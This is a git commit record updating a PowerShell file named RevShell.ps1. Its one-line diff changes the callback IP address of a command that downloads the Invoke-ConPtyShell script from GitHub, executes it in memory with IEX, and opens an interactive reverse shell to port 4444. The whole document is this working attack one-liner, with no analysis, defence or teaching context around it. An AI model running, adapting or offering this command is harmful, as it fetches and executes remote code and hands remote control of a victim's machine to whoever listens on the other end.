9a5f737bbeedbeb0531ffed105a44ad4e8588f4e
Olivgamer05 <olivgamer05@gmail.com>
2021-11-09 11:58:50 +0100

    Update RevShell.ps1

--- RevShell.ps1
+++ RevShell.ps1
@@ -1,1 +1,1 @@
-IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.250.62.143 4444
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.250.62.129 4444
